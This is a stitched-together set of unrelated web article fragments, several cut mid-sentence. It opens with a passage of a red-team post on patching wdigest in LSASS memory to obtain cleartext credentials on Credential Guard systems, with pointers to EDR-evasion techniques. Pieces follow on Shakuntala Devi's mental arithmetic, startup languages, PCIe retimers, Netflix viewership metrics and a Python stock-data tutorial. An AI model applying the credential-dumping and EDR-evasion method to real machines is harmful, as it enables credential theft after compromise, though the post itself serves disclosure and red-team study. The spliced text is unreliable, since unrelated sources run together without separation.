<p>So, what happens when we patch wdigest to enable UseLogonCredentials and unset IsCredGuardEnabled?&nbsp;</p>

<p>Clear text credentials!&nbsp; Note, this is NOT disabling Credential Guard but instead circumventing it by enabling wdigest.</p>



<p>As Credential Guard exists explicitly to help prevent elevated attackers from obtaining credentials from LSASS I reported this to Microsoft on principle.</p>



<p>Their response:</p>



<p>“After investigating this issue, we do not believe this is a Credential Guard bypass. Credential Guard is meant to protect credentials that were cached while the feature is enabled. If a privileged user disables Credential Guard, then the feature cannot protect subsequent logons. We’ll update our public documentation to clarify this behavior”</p>



<p>Given this response, I suspect this will be a reliable method of gaining clear text credentials on systems with Credential Guard enabled for the foreseeable future.</p>



<p>Memory patching host-based defenses has become a major aspect of modern red teaming.&nbsp; It is used to bypass AMSI, disable ETW, blind EDRs, and get cleartext credentials.&nbsp; This is just one more minor addition to the application of this type of technique. &nbsp;Hopefully posts like this will lead to increased visibility and better mitigation for this type of post-compromise action.</p>



<p>OPERATIONAL CONSIDERATIONS</p>



<p>The PoC provided IS NOT OPSEC SAFE.&nbsp; It is meant to demonstrate the concept.&nbsp; One of the biggest issues with this technique is that you are interacting directly with LSASS which is often looked for by EDRs (especially WriteProcessMemory).&nbsp; There have been many great posts about overcoming some of these hurdles (<a href="https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6">unhooking</a> and using <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">direct syscalls</a>) but I leave it to you to pursue implementing this technique operationally.</p>



<p>DETECTION AND PREVENTION</p>



<p>Not much to say here that hasn’t been said before.&nbsp; Monitoring LSASS, limiting administrators, network segmentation, all the usual suspects apply.&nbsp; A motivated and knowledgeable adversary that gains SYSTEM on a machine in your network will probably be able to accomplish what they need to on THAT system.&nbsp; The goal is to increase the cost in time, effort, and tooling to achieve that goal thus making your network less appealing as a target and increasing opportunities for detection and response. </p>

<p><em>This was originally posted as an answer on Quora to the question “<a href="https://www.quora.com/How-did-Shakuntala-Devi-mentally-calculate-the-23rd-root-of-a-201-digit-number-correctly/answer/Peter-S-Magnusson" target="_blank">How did Shakuntala Devi mentally calculate the 23rd root of a 201-digit number correctly?</a>“.&nbsp;</em></p>
<p><span>Devi was a very talented mental calculator, but by no means the extreme prodigy that she has been made out to be in the media, and she certainly couldn’t take the 23rd root of a number “faster than a computer”.</span></p>
<p>She was an accomplished showman – she grew up traveling with her father and giving performances, and when her father got too old, she travelled by herself and sent money to her family. The modern field of mental calculators generally shies away from words like “prodigy” or “genius”. Mental calculation is obviously related to mathematics, but many of the historically great mental calculators were not particularly knowledgeable in mathematics per se.</p>
<p>By calling her an “accomplished showman”, I don’t mean to denigrate her at all, quite to the contrary. It’s an intricate, and old, art form, dating at least to the 1700s, more akin to the work of an illusionist than that of a professor in mathematics. It takes hard work and dedication to be a good illusionist of any sort. Devi was born, and performed, in a simpler era, one before the internet and computers that have deconstructed much of the “magic” of these artists. And her story in particular – as a poor child traveling in India, earning a living for her family with her demonstrations – holds a deep appeal to us. Especially since, by all accounts I’ve read of those who met her, she was a very special person.</p>
<p>(If you want a demonstration of the “powerful magic” of mental calculation, just search the internet for the tricks involved in solving 3rd roots and 5th roots of large integers in your head. You will astonish your friends and family by just a little effort of rote memorization.)</p>
<p>There are a few things you first have to know about mental calculations of this sort. They are mostly related to memorization and pattern matching, and putting various significant constraints on the problems being asked. If you are not versed in the arts, some tricks that appear very difficult are in fact quite simple. That, after all, is the general art of illusion.</p>
<p>Today, this art form is called “mathemagic”, and notable “mathemagicians” include Martin Gardner, Arthur T Benjamin, Raymond Smullyan, and Persi Diaconis.</p>
<p>Let me take an example from Devi’s life, before I jump into the actual question. Famously, Devi travelled to the US in 1988, including a visit to San Francisco. A Psychology Professor at Berkeley attended one such event, and he published an article about it in 1990 (“Speed of Information Processing in a Calculating Prodigy”, Arthur R. Jensen, INTELLIGENCE 14, 259-274).&nbsp;Jensen describes how he gave two questions to Devi on note cards that he had prepared:<br>
</p>
<blockquote><p>“When I handed Devi two problems, each on a separate card, thinking she would solve first one, then the other, my wife was taken by surprise, as there was hardly time to start the stopwatch, so quick was Devi’s response. Holding the two cards side-by-side, Devi looked at them briefly and said, “The answer to the first is 395 and to the second is 15. Right?” Right, of course! (Her answers were never wrong.) Handing the cards back to me, she requested that I read the problems aloud to the audience. They were: (a) the cube root of 61,629,875 (= 395), and (b) the 7th root of 170,859,375 (= 15). I was rather disappointed that these problems seemed obviously too easy for Devi, as I had hoped they would elicit some sign of mental strain on her part. After all, it had taken me much longer to work them with a calculator”</p></blockquote>
<p><span>Let’s look closely at&nbsp;the first problem, finding the cube root of 61,629,875. The third root of an 8-digit number will have exactly three digits (because it will be between 215 and 464). The third digit is trivial, because a number cubed, modulo 10, only depends on the last digit. In fact, most of the digits are identical – if the last digit of a cube is 1, 4, 5, 6, 9, or 0, then it’s the same in the root; 2 and 8 swap places as do 3 and 7. So we know the last digit is “5”. The first digit is trivial too, in an 8-digit cube it can only be 2, 3, or 4. In this case 61 is close to 64, which is 4 cubed. In fact, it’s very close, so we know the answer will be just below 400, because 400 cubed is 64,000,000. Now, what 3-digit number is just below 400 and ends in 5?</span></p>
<p>That’s why it only took Devi a few seconds to answer. Jensen, a psychologist, doesn’t know the art. Just as it takes a magician to explain what another magician does, it takes an accomplished mental calculator to explain the field to you. What seems amazing (cube root of 61,629,875 in two seconds!) might be straight forward if you know the “trade”.</p>
<p>Though Jensen was not an appropriate judge of these mental feats, he did subject her to a full range of psychological testing, and those are the parts that are valuable reading in his article. Notably, she didn’t score exceptional in any cognitive area, except memory for numbers.</p>
<p>In Devi’s case, we don’t know what techniques&nbsp; she used for this demonstration. Why? Because she never told people. And why would she. She had made a living since kindergarten as a performer. Professional performers don’t reveal their magic. If they do, it’s not magical any more.</p>
<p>But lots of other mental calculators have shared details, many at least on par with Devi’s abilities and several distinctly stronger – people like Wim Klein, Hans Eberstark, Gert Mittring, and Alexis Lemaire, the latter likely the greatest living mental calculator.</p>
<p>Now, let’s get a bit closer to the actual question.</p>
<p>The original story is that in 1977, at the Southern Methodist University in Dallas, Devi extracted the 23rd root of a 201-digit number. As reported at the time (Dallas Morning News, January 26th and later a bit more sensationalized in an editorial on February 6th), the problem was presented to her from a calculation on a Univac 1101 at the Bureau of Standards, and it took the computer over a minute to calculate it, but it took Devi just 50 seconds. Therefore, she had “beaten the computer”, which became the theme of the media coverage and greatly contributed to her fame.</p>
<p>The problem, as posed, was to take the 23rd root of this number:</p>
<p>916, 748, 676, 920, 039, 158, 098, 660, 927, 585, 380, 162, 483, 106, 680, 144, 308, 622, 407, 126, 516, 427, 934, 657, 040, 867, 096, 593, 279, 205, 767, 480, 806, 790, 022, 783, 016, 354, 924, 852, 380, 335, 745, 316, 935, 111, 903, 596, 577, 547, 340, 075, 681, 688, 305, 620, 821, 016, 129, 132, 845, 564, 805, 780, 158, 806, 771</p>
<p>The answer (in case it’s not immediately obvious to you) is 546,372,891.</p>
<p>The first thing to note was that the Univac 1101 and Devi were solving two completely different problems. Raising a nine-digit number to the 23rd power –&nbsp; e.g. multiplying a number by itself 23 times – is a much harder problem than taking the 23rd root – if you know that the result will be an integer.</p>
<p><i>(Parenthetically, the “1101” is probably a typo or some other error. That model is a 1951 vacuum-tube computer that could do about three multiplications per second. Other reports said Univac 1106, or 1108, but that was from 1969 and also a bit old at the time. The “Bureau of Standards” was responsible for running US census data, and thus the principal government progenitor of much of the computer industry. Given the year of 1977, my guess would be that it was actually a Univac 1110, which launched in 1972. Though why anybody would chose a Univac in 1977 is another mystery, since by then IBM had long taken over the industry. But “Univac” was famous and known by readers, after having predicted the Presidential election in 1952 live on television. So it was probably equivalent in people’s minds to “big computer”.)</i></p>
<p>In general, the difficulty lies not in the size of the number (201 digits) or the power (23). It’s the number of digits in the answer. Now, the 23rd root of a 201-digit number will have nine digits. Remember the example above, of a 3rd root that resulted in a 3-digit answer? The beginning and the end are trivial, the middle requires some thought.</p>
<p>The same principle continues to apply to larger powers – except that the notion of “trivial” becomes “quite difficult”, and the notion of “some thought” becomes “that’s really hard”.</p>
<p>In this case, nine digits, the middle two are the hard ones – the first three and the last four are “easy”.</p>
<p>The last four (2891) of the answer is completely determined by the last four (6771) of the cube.</p>
<p>If you want to test that, try raising the number xxx,xx2,891 to the power of 23 – and insert any numbers you want for the “x”:s. In fact, you can take any integer that ends with “2891” and take it to the 23rd power, and the result will end in 6771.</p>
<p>To know what four digits translate to what four digits, there are a bunch of tables you need to memorize, but that’s not as hard as it sounds. For example, the choice of “23” is not a random. Powers of integers where the power is of the form (4n+3) have (simple) patterns for the trailing digits. In particular the last digit is unchanged so you don’t have to remember it at all. Choosing appropriate power (23 in this case) translates to simpler tables to memorize for this step.</p>
<p>Now, look carefully at the first six digits – “916748”. The number “48” is right next to “50”, which means this six-digit number is halfway between “916700” and “916800”. We’ll soon see how this helps.</p>
<p>Let’s start by taking the first four (9167) and factoring it – that’s 89 * 103. Next we apply log tables – at least that’s one of the standard techniques. For this step, I’ll assume Devi has memorized the first 150 or so logs to five decimal digits.</p>
<p>Log (base 10) of each factor is 1.94939 and 2.01284, respectively. Adding the mantissas yield 0.96223. Remember that log(xy) = log(x) + log(y).</p>
<p>Now let’s …</p></div></div>

<p>Note: Ginkgo Bioworks, Boom Supersonic, Grin, Memebox, Helion Energy, North, RelativitySpace, and The Athletic were excluded from the below list; I didn't feel they were primarily software businesses. Feel free to disagree with my judgement.</p>
<p>Note: values current as of August 15, 2020.</p>
<p>Note: if one language was the primary language used to build the initial product, one language is listed above. If it was not clear which language was primary, multiple languages are listed above.</p>
<p>Note: if I couldn't find which language was used to build the startup initially, I referenced the oldest job posting I could find.</p>
<p>Note: valuations are approximate and predominantly sourced from recent articles online. Where I couldn't find an indication of value, ~$150M is assumed; startups listed above were all worth +$150M as of October 2019, as per the <a href="https://www.ycombinator.com/topcompanies/">YC Top Companies</a> page.</p>
<p>Note: "Y" and "N" values in the "DataSci / LowLv" column describe a startup's primary product (i.e. ML startups would have a "Y" for DataSci). It was included to provide additional colour on why initial back-end language(s) may have been used / selected. The values in this column are based entirely on my own judgement. Feel free to disagree with them or ignore them.</p>
<p>Note: Ruby and ruby on rails was a popular choice for YC startups around 2010 - 2012. Anecdotally, ~40% of YC startups used ruby during its peak popularity.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Retimers and redrivers have enabled longer physical channels in servers and storage systems since Peripheral Component Interface Express (PCIe) 3.0 was first introduced almost 10 years ago. Now that PCIe 4.0 is ramping up and PCIe 5.0 is just around the corner, how do these reach extension tools stack up in the face of new challenges in high-speed connectivity?</p>
<p>A redriver is a mostly analog reach extension device designed to boost the high-frequency portions of a signal to counteract the frequency-dependent attenuation caused by the interconnect: the central processing unit (CPU) package, system board, connectors and so on. A redriver’s data path typically includes a continuous time linear equalizer (CTLE), a wideband gain stage and a linear driver. In addition, redrivers often have input loss-of-signal threshold and output receiver (Rx) detection capability. Figure 1 illustrates a typical redriver block diagram.</p>

<p>A retimer is a mixed signal analog/digital device that is protocol-aware and has the ability to fully recover the data, extract the embedded clock and retransmit a fresh copy of the data using a clean clock. In addition to the CTLE and wideband gain stages also found in a redriver, retimers contain a clock and data recovery (CDR) circuit, a decision feedback equalizer (DFE) and a transmit (Tx) finite impulse response (FIR) driver. Finite state machines (FSMs) and/or a microcontroller typically manage the automatic adaptation of the CTLE, wideband gain, DFE and FIR driver, and implement the PCIe link training and status state machine (LTSSM). Figure 2 illustrates a typical retimer block diagram.</p>

<p>In simple terms, a redriver amplifies a signal, whereas a retimer retransmits a fresh copy of the signal. Figure 3 illustrates this and shows how an attenuated eye opening is boosted by a redriver and completely regenerated by a retimer.</p>

<p>Figure 3: Example of an eye attenuated by a channel (left), the eye after a redriver (middle) and the eye after a retimer (right)</p>
<p>The PCIe 4.0 specification took the unprecedented step of formally defining the terms “retimer,” “redriver” and the superset term “repeater,” all of which are types of extension devices or components whose purpose is to extend the physical length of a link. The definitions are:</p>
<ul>
<li><strong>Repeater</strong>: An imprecise term for an extension device [2]. (This term causes confusion … please don’t use it!)</li>
<li><strong>Redriver</strong>: A non-protocol-aware software-transparent extension device [2].</li>
<li><strong>Retimer</strong>: A physical layer protocol-aware, software-transparent extension device that forms two separate electrical link segments [2].</li>
</ul>
<h3>Use Cases for Retimers and Redrivers</h3>
<p>Reach extension devices are necessary whenever the channel – the electrical path between the root complex (RC) and endpoint (EP) – is longer than the PCIe specification allows. The specification defines the maximum channel length in terms of insertion loss at the Nyquist frequency (an informative specification, but easy to validate) and in terms of a reference receiver’s ability to sufficiently equalize and recover the data assuming a worst-case link partner transmitter (a normative specification, but time-consuming to validate).</p>
<p>Suffice it to say, at PCIe 4.0 speeds, reach extension devices are necessary for:</p>
<ul>
<li>Multiconnector topologies.</li>
<li>Cabled topologies.</li>
<li>Single-connector add-in card (AIC) topologies with baseboard channels longer than 9.5 inches.</li>
</ul>
<p>Figure 4 shows an example of a two-connector “riser card” topology, which ordinarily would exceed the PCIe 4.0 loss budget of 28 dB. A redriver or retimer will enable reliable, error-free communication between the RC and EP. But how do you choose which one is the right tool for the job? Well, it helps to know more about the fundamental differences in their capabilities.</p>

<h3>Comparing Retimer and Redriver Capabilities</h3>
<p>Not all redrivers and retimers are the same. There are many distinctions between the two, which are universally true for all PCIe reach extension devices. For example:</p>
<p><strong>Retimers actively participate in the PCIe protocol; redrivers do not.</strong> The PCIe base specification spells out how and to what extent retimers participate in the protocol during Detect, Recovery, L0 and other LTSSM states. Equalization to the L0 and L1 link states requires value-added functionality from the retimer (handshakes, timeouts, bit manipulation, etc.). Redrivers are unaware of and unparticipating in the protocol. If the link works reliably the first time, that’s great! But if the link experiences marginality of any sort, it becomes exceedingly difficult to pinpoint whether the problem is physically before the redriver or after it, since the redriver’s role in link formation is undefined and unknown to its link partners.</p>
<p><strong>Retimers reset the jitter and insertion loss budgets; redrivers do not.</strong> A retimer’s CDR fully recovers the data stream and retransmits it on a clean clock. Starting with a fresh copy of the data enables the extension of the channel to twice the original specification. Without a CDR, the best a redriver can do is attenuate (not reset) the data-dependent jitter (DDJ) caused by intersymbol interference (ISI). A redriver cannot attenuate uncorrelated or random jitter (RJ). In fact, a redriver will always add to RJ due to its own device thermal noise in a root-mean-square (RMS) manner <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>.</p>
<p><strong>Retimers have a DFE; redrivers do not.</strong> A DFE compensates for reflections in the channel response caused by impedance discontinuities in board vias, connectors and package socket-board interfaces. The nice thing about a DFE is that it is unaffected by crosstalk. The DFE equalizes just as well in the presence of crosstalk, and once the data is sampled by the retimer’s CDR, crosstalk is eliminated for good. Redrivers use a CTLE that boosts both the signal and the noise <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>. Crosstalk is not eliminated or even attenuated through a redriver; in fact, it gets amplified.</p>
<p><strong>Retimers automatically adapt their receive and transmit equalizers to match the characteristics of the channel and the link partner’s needs; redrivers do not.</strong> A retimer will examine the signal it receives and adjust the CTLE and DFE to minimize its own bit error rate (BER). Likewise, the retimer’s transmitter will adjust its de-emphasis and pre-shoot equalization to minimize the link partner’s BER according to PCIe equalization protocol. A redriver, conversely, operates with a static equalizer setting. The optimal setting (which can be different for every channel in the system) is often painstakingly selected following an exhaustive search in Input/Output Buffer Information Specification (IBIS) algorithmic modeling interface (AMI) simulations and again in lab testing – a process fondly referred to as “tuning.”</p>
<p><strong>Retimers have built-in features to help diagnose link issues (both electrical and protocol); redrivers do not.</strong> Retimers have tools for assessing the electrical performance (internal eye monitors, pattern generators, pattern checkers) and protocol performance (link state history monitors, timeout adjustments). Redrivers cannot offer such diagnostic features because they are neither protocol-aware nor aware of the actual data passing through. Redrivers do not know what state the link is in.</p>
<p><strong>Retimers correct for lane-to-lane skew; redrivers do not.</strong> PCIe has a tight requirement on the physical skew between lanes on a board (1.6 ns for PCIe 4.0), typically caused by mismatches in channel routing length [3]. Retimers are required to compensate and reset any lane-to-lane skew, effectively doubling the specification budget. Redrivers cannot compensate for lane-to-lane skew, and what’s worse is that they may degrade the skew depending on how symmetric the redriver package is across all lanes.</p>
<p><strong>Retimers can be placed anywhere between two PCIe-compliant channels; redrivers cannot.</strong> By definition, retimers extend the total PCIe channel reach by two times the specification. A redriver’s reach extension, however, depends on where it is placed in the channel – how much loss is before the redriver versus how much is after <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>. The specific placement of a redriver must be carefully determined by IBIS-AMI simulation and experimentation. Too close to the root complex transmitter, and the redriver’s CTLE will enter nonlinear operation and will have limited benefit. Placed too far from the transmitter, the redriver’s device noise may significantly degrade the signal-to-noise ratio (SNR) of the data signal.</p>
<p>It’s not all bad news for redrivers. They do have lower power consumption and lower input-to-output latency compared to retimers. But if the link does not form in the first place or if the BER is too high, none of that matters!</p>

<h3>Outlook for PCIe 4.0 Systems</h3>
<p>Looking ahead to the upcoming PCIe 4.0 systems, all signs are pointing to an increased need for reach extension devices – and retimers in particular – due to several trends and challenges:</p>
<ul>
<li>CPUs have more PCIe lanes per socket (&gt;100 in some cases [4]) compared to PCIe 3.0. This leads to a greater number of PCIe slots and riser cards, denser routing, and an increased use of multiconnector topologies.</li>
<li>PCIe is shifting from an I/O bus to a multipurpose system interconnect. This means that more servers will be designed to be modular, allowing an array of compute, storage and networking resources to plug in to an increasing number of PCIe slots. This type of open, “plug anything in and it will work” server architecture requires a reach extension solution that is PCIe compliant with plug-and-play interoperability.</li>
<li>The disaggregation of resources such as modular servers, storage trays and accelerator trays is pushing endpoints physically away from CPUs, requiring cables or carrier cards to connect everything together. These longer physical topologies will increasingly need reach …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main"><article><div><p>As you might have already seen on the Twitter-verse and in <a href="https://www.bloomberg.com/news/articles/2020-07-15/netflix-most-popular-original-movies">Bloomberg</a>, Netflix released its top 10 movies and Extraction topped that list. The numbers in the data represent the number of views that a movie has gathered in the first 4 weeks of its release.</p><p><img src="https://ottverse.com/images/netflix-top-10-movies.png" alt="Top 10 list from Netflix"></p><p>Looks great, right? 99M viewers for Extraction - that’s a huge win for Netflix.</p><p><img src="https://ottverse.com/images/the-extraction-randeep-hooda-chris-hemsworth.png" alt="Extraction from Netflix"></p><p>But, wait. Can we trust these numbers right off the bat?</p><h2 id="netflixs-data-and-reporting-methodologies">Netflix’s Data and Reporting Methodologies</h2><p>The problem with Netflix is that they guard their data religiously and have never released their data in its entirety to the public. So, if they tell you that a movie was watched 100M times in Japan, you just have to take their word for it and break out a bottle of champagne if you were the producer or actor in that film.</p><p>When Netflix’s data says that “Extraction” starring “Thor” Chris Hemsworth and Bollywood star Randeep Hooda garnered 99 million views within the first 4 weeks of its release, does it mean that the movie was truly exceptional and beat every other release on Netflix in terms of audience numbers?</p><p>Well, to be honest, I really can’t say because Netflix’s data is opaque, their methodology is unknown, and their definition of a movie’s popularity using only their “starters” metric is odd to say the least.</p><p>Let me explain why.</p><h2 id="how-does-netflix-quantify-their-audience">How does Netflix Quantify Their Audience</h2><p>The first step in decoding the data that Netflix released is understanding the definitions of their metrics.</p><p>Here is what Netflix shared with the <a href="http://data.parliament.uk/writtenevidence/committeeevidence.svc/evidencedocument/communications-committee/public-service-broadcasting-in-the-age-of-video-on-demand/written/104558.html">United Kingdom’s House of Lords’ Communications Committee</a>:</p><blockquote><p>The information we give them mainly consists of “starters” (i.e. households that watch two minutes of a film or one episode) and “completers” (i.e. households that watch 90% of a film or season of a series) for the first seven and 28 days on Netflix. We believe that these two metrics will give our creative partners a broader understanding of how members engage with their title from start to finish. We also selectively share “watchers” (i.e. households that watch 70% of a film or single episode of a series) with both the public and with creators. Depending on how useful our partners find this data, we will consider sharing it in more countries outside Europe and North America.</p></blockquote><p>Distilling this into the main classifications, we get:-</p><ul><li><strong>starters</strong>: households that watch two minutes of a film or one episode</li><li><strong>watchers</strong>: households that watch 70% of a film or single episode of a series</li><li><strong>completers</strong>: households that watch 90% of a film or season of a series</li></ul><p>Only 2 mins? Which 2 minutes - from the beginning, in the middle, or from the point they left off the previous day?</p><p>In the <a href="https://s22.q4cdn.com/959853165/files/doc_financials/2019/q4/FINAL-Q4-19-Shareholder-Letter.pdf">Q4 2019 letter shared by Netflix to its shareholders</a>, Netflix reveals their definition of a view and its impact on its data reports. I’ve copy-pasted the relevant section here and highlighted the important parts.</p><blockquote><p>As we’ve expanded our original content, we’ve been working on how to best share content highlights that demonstrate popularity. <strong>Given that we now have titles with widely varying lengths - from short episodes (e.g. ​Special​ at around 15 minutes) to long films (e.g. ​The Highwaymen​ at 132 minutes), we believe that reporting households viewing a title based on 70% of a single episode of a series or of an entire film, which we have been doing, makes less sense.</strong> We are now reporting on households (accounts) that chose to watch a given title . Our new methodology is similar to the BBC iPlayer in their rankings​ based on “requests” for the title, “most popular” articles on the New York Times which include those who opened the articles, and YouTube view counts. <strong>This way, short and long titles are treated equally, leveling the playing field for all types of our content including interactive content, which has no fixed length. The new metric is about 35% higher on average than the prior metric.</strong> For example, 45m member households chose to watch ​Our Planet​ under the new metric vs. 33m under the prior metric.</p></blockquote><p>Buried in a footnote on the same page in the <a href="https://s22.q4cdn.com/959853165/files/doc_financials/2019/q4/FINAL-Q4-19-Shareholder-Letter.pdf">Q4 2019 shareholder letter</a> is an explanation of what “chose to watch a given title” means -</p><blockquote><p>Chose to watch and did watch for at least 2 minutes – long enough to indicate the choice was intentional – is the precise definition</p></blockquote><p>Netflix says that this method of reporting is similar to what the BBC and YouTube do, and so, they aren’t doing anything funny here.</p><p>Well, summarizing everything till now, it appears that Netflix counts how many sessions lasted at least 2 minutes and this metric is used to quantify their audience.</p><h2 id="the-issue-with-reporting-based-on-starters">The Issue with Reporting Based on “starters”</h2><p>Portraying a movie’s popularity based solely on “starters” is where things begin to get weird for me.</p><p>Having spent a few years in the video analytics industry, I can say with absolute confidence that a large number of views does not * <strong>always</strong> * translate to popularity. There are caveats one has to consider and some amount of data cleansing and outlier removal is needed before drawing broad conclusions.</p><p>When I look at such viewership statistics, a few questions come to mind immediately.</p><ul><li>How long was each view (beyond the 2 minute minimum i.e.)?</li><li>When did each view begin and end (i.e., start and end times)?</li><li>How many views or sessions did a person take to completely watch a movie?</li></ul><p>Note: “completely” generally means 90% of the playtime of a movie and this is considered as an acceptable threshold in the industry because people generally skip the credits.</p><p>Now, let’s understand with the help of a few examples of why these questions are important in making sense of an audience’s engagement.</p><h3 id="problem-1-if-a-person-watches-only-2-minutes-that-should-not-count-towards-the-movies-popularity">Problem 1: if a person watches only 2 minutes, that should not count towards the movie’s popularity.</h3><p><strong>Example 1:</strong> if a person began to watch Extraction, watched it for 2 mins, found it utterly boring, and decided to bail on it after just 3 minutes, then do you count it as a view or a starter? Well, logically speaking - he did start the movie, but, when you take this number without context (the viewer dropped out after 3 minutes) and use it to justify a movie’s “popularity”, it’s not right.</p><p><strong>Example 2:</strong> Let’s assume that Netflix acquires the “Oceans” franchise and decides to produce the “Oceans 21” with 21 A-Listers from Hollywood. And by a cruel twist-of-fate, they produce a movie with the worst possible storyline and direction. However, what they do get right is marketing! Netflix pulls out all the stops and does a brilliant job at marketing the movie and building up excitement for Oceans 21.</p><p>On the day of release, Oceans 21 gets millions of hits because people are excited to see George Clooney and Brad Pitt crush it! But, what’s happening?</p><ul><li>10 minutes into the movie, most of the viewers realize that the movie sucks and stop watching. But, they are added to the movie’s popularity count because they watched 2 mins, right?</li><li>a section of Netflix’s subscribers who haven’t (yet) heard that the movie sucks end up watching at least 10 mins of the movie before bleeding out of their eyes. But, they too are added to the “watch” count because they watched 2 mins, right?</li><li>and, the die-hard fans of the Oceans’ franchise will watch it no matter what the critics say and of course, they are going to be added to the “watch” count.</li></ul><h3 id="problem-2-multiple-viewing-sessions-from-the-same-subscriber-arent-considered">Problem 2: Multiple Viewing Sessions from the Same Subscriber Aren’t Considered</h3><p>The definition of “starter” also does not take consider multiple viewing sessions and this is an issue. Let’s take a simple example to understand more.</p><p><strong>Case A:</strong> I might have watched a single movie over a period of 10 days watching 10-15 mins each day, because I need to split my day between work, babysitting my toddlers, yard-work, etc.</p><p><strong>Case B:</strong> Now consider another situation where I had the entire Saturday night to myself and watched an entire 1.5 hour movie in one sitting.</p><p>So, is A more popular than B? It will under Netflix’s algorithm because A had 10 “starters” and B had only one.</p><p>Sounds wrong, doesn’t it? Okay, now let’s look at the problem from a different angle.</p><h2 id="does-netflixs-data-translate-to-imdb-and-rotten-tomato-ratings">Does Netflix’s data Translate to IMDB and Rotten Tomato ratings?</h2><p>Take a look at the IMDB and Rotten Tomato ratings for Netflix’s Top 10 list because these ratings play a huge role in a movie’s continued - importantly, after the marketing hype has died down.</p><p>We compiled the IMDB and Rotten Tomato ratings (as of July 16th 2020 at 6 am UTC) and here is what the data shows.</p><p><img src="https://ottverse.com/images/netflix-top10-imdb-rottentomato.png" alt=""></p><p>At first glance, you might think that IMDB appears to agree with Netflix’s popularity chart, but, The Irishman throws a curveball coming in at 7.9 in IMDB and 96% in Rotten Tomato while languishing at #6 in Netflix. The same goes for The Platform which has great ratings from both IMDB and Rotten Tomato, but is at the 9th position in Netflix’s data.</p><p>Let’s look at this data in a different perspective.</p><p><img src="https://ottverse.com/images/ranking-of-movies-netflix-imdb-rottentomato.png" alt=""></p><p>Below is a table where we have ranked the movie based on the audience’s ratings/reviews on IMDB and Rotten Tomato. We have highlighted three movies in particular - Extraction, The Irishman, The Platform to show how different they are ranked based on the data from Netflix, IMDB, and Rotten Tomato.</p><p>Quit different, eh?</p><p>The Platform’s ranking goes to show that a movie might not have the same number of views as more “popular” movies, but, can be highly rated by the audience. So, does Netflix’s methodology have flaws?</p><h2 id="what-data-from-netflix-will-help">What Data from Netflix Will Help?</h2><ul><li><strong>Viewing Trends for 4 weeks:</strong> Instead of providing a single, aggregated number, it will be great if a trendline of the number of “watch"s is released.
This will help us understand the influence of the first few days of release on the overall aggregated figure and how a movie fares after the initial hype has died down.</li><li><strong>Number of Sessions Required to achieve a “Complete” Watch:</strong> How many sessions does the average user take to watch a movie completely? If the average viewer take 3 attempts to watch a movie fully, and if the movie has 30 million views, it probably is safe to assume that the movie wasn’t watched fully 30 million times. Right?</li><li><strong>Session Durations as a function of the length of the Content:</strong> preferably represented as a histogram.</li><li><strong>Internal Ratings:</strong> Can Netflix tell …</li></ul></div></article></div></div>

<h2 id="16bb">Anyone Can Do This</h2>



<p>Beginners welcome. I’ve created this guide for Python developers of all skill levels. Maybe you don’t even know what Python is, and that’s okay! I’ve got you. </p>



<p>If you’ve read any of <a href="https://handsoffinvesting.com/guides/" target="_blank" rel="noreferrer noopener">my articles</a> about automating the stock analysis process, you’ve probably seen this code before. I figured that since this program is so integral for algorithmic investing, I need to break it down further and make sure that everyone understands how to use it!</p>



<p>After running this program you’ll be left with a folder on your device that contains the historical data of any number of stocks. Also, I’ve simplified the code by breaking it into sections and giving a description of what each part of the code does.</p>



<p id="bc40">If this is your first time using Python (or coding in general), I’d recommend reading&nbsp;<a href="https://www.codecademy.com/articles/install-python" target="_blank" rel="noreferrer noopener">this article</a>&nbsp;for a simple walk-through of the installation and startup process. And don’t worry, everybody learns how to code through practice. This is a great place to start learning!</p>



<figure><blockquote><p>Programming is a skill best acquired by practice rather than from books. — Alan Turing</p></blockquote></figure>



<hr>



<h2 id="0a66">Libraries</h2>



<p>They make life so much easier. These libraries are going to help us make quick work of the data importing process. Using them, we’ll be able to:</p>



<ol><li>Filter through all of the stocks in the NYSE, NASDAQ, and AMEX. </li><li>Create and delete a file on our local machine (computer) to store the stock data.</li><li>Pull and save historical stock data from Yahoo Finance.</li></ol>



<p id="29d1">Importing the necessary libraries can be done in two simple lines of code.</p>



<div><pre data-lang="Python"><code>import yfinance as yf, pandas as pd, shutil, os
from get_all_tickers import get_tickers as gt</code></pre></div>



<p>Here are the use-cases for each library, as well as where you can go to learn more.</p>



<ul><li><a href="https://pypi.org/project/yfinance/" target="_blank" rel="noreferrer noopener">Yfinance</a>: Gather historical/ relevant data on each stock.</li><li><a href="https://pandas.pydata.org/docs/reference/index.html" target="_blank" rel="noreferrer noopener">Pandas</a>: Work with large sets of data.</li><li><a href="https://docs.python.org/3/library/shutil.html" target="_blank" rel="noreferrer noopener">Shutil</a> and&nbsp;<a href="https://docs.python.org/3/library/os.html" target="_blank" rel="noreferrer noopener">OS</a>: Accessing, creating, and deleting folders/files on the computer.</li><li><a href="https://github.com/shilewenuw/get_all_tickers" target="_blank" rel="noreferrer noopener">Get_All_Tickers</a>: Filter through all stocks to get the list you desire.</li></ul>



<hr>



<h2>The List of Stocks (Tickers)</h2>



<p>The library “<a href="https://github.com/shilewenuw/get_all_tickers" target="_blank" rel="noreferrer noopener">get-all-tickers</a>“, allows us to filter through all of the stocks in the NYSE, NASDAQ, and AMEX. Doing this gives us a list of stock tickers that we can then analyze one at a time. </p>



<p>Currently, the library supports filtering stocks by their <strong>region</strong>, <strong>sector</strong>, <strong>market cap</strong>, and <strong>exchange</strong>. For this example I am looking at companies that have a market cap between $150,000 and $10,000,000 (in millions). You will notice that I also included a line of code to print the number of tickers we are using. </p>



<p><strong><span>This is very important</span></strong><span>:</span></p>



<p>You will need to be sure that you are not targeting more than 2,000 tickers, because the Yfinance API has a 2,000 API calls per hour limit.</p>



<div><pre data-lang="Python"><code>tickers = gt.get_tickers_filtered(mktcap_min=150000, mktcap_max=10000000)
